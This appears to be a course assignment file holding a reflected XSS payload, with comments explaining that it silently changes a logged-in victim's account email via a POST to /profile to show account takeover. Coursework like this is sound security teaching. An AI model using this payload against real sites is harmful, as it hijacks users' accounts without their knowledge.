// FIT5003 A2 - Part B.2 reflected XSS payload
// When executed in a logged-in victim's browser, this silently changes
// their account email via the /profile endpoint, proving account takeover.
fetch('/profile', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=hacked-by-xss@attacker.local&password='
});
